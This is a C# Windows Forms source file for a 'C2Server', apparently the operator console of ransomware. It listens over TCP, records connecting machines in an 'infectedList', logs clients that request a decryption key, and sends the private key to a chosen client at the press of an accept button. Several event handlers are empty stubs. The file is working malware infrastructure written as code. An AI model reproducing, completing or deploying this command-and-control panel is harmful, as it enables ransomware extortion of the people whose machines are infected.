using SuperSimpleTcp;
using System.Text;

namespace C2Server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        SimpleTcpServer server;

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            acceptButton.Enabled = false;
            denyButton.Enabled = false;
            server = new SimpleTcpServer(ipTextBox.Text);
            server.Events.ClientConnected += Events_ClientConnected;
            server.Events.ClientDisconnected += Events_ClientDisconnected;
            server.Events.DataReceived += Events_DataRecived;

        }





        private void Events_DataRecived(object? sender, DataReceivedEventArgs e)
        {
            this.Invoke((MethodInvoker)delegate
            {
                requestList.Items.Add(e.IpPort);
                logTabTextBox.Text += $"{e.IpPort} requested decryption key. {Environment.NewLine}";
            });
            
            
        }

        private void Events_ClientConnected(object? sender, ConnectionEventArgs e)
        {
            this.Invoke((MethodInvoker)delegate
            {

                //server.Send(e.IpPort, "you are connected");

                if (infectedList.Items.Contains(e.IpPort))
                {
                    logTabTextBox.Text += $"{e.IpPort} is back!{Environment.NewLine}";
                }
                else
                {
                    logTabTextBox.Text += $"{e.IpPort} connected first time.{Environment.NewLine}";
                    infectedList.Items.Add(e.IpPort);
                }
            });
        }
            
        

        private void Events_ClientDisconnected(object? sender, ConnectionEventArgs e)
        {
            this.Invoke((MethodInvoker)delegate
            {
                logTabTextBox.Text += $"{e.IpPort} disconnected.{Environment.NewLine}";
            });
           
        }




        private void denyButton_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void requestList_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void startButton_Click(object sender, EventArgs e)
        {
            server.Start();
            logTabTextBox.Text += $"Starting...{Environment.NewLine}";
            startButton.Enabled = false;
            stopButton.Enabled = true;
            acceptButton.Enabled = true;
            denyButton.Enabled = true;




        }

        private void stopButton_Click(object sender, EventArgs e)
        {
            server.Stop();
            stopButton.Enabled = false;
            startButton.Enabled = true;
            logTabTextBox.Text += $"Stopping...{Environment.NewLine}";

        }

        private void acceptButton_Click(object sender, EventArgs e)
        {
            if (server.IsListening)
            {
                if(requestList.SelectedItem != null)
                {
                    try
                    {
                        server.Send(requestList.SelectedItem.ToString(), privKeyTextBox.Text);
                        logTabTextBox.Text += $"Decryption key sent to: {requestList.SelectedItem.ToString()}{Environment.NewLine}";
                        requestList.Items.Remove(requestList.SelectedItem);
                        Console.WriteLine(privKeyTextBox.Text);
                    }
                    catch(Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    

                }
            }
        }

        private void ipTextBox_TextChanged(object sender, EventArgs e)
        {

        }
    }
}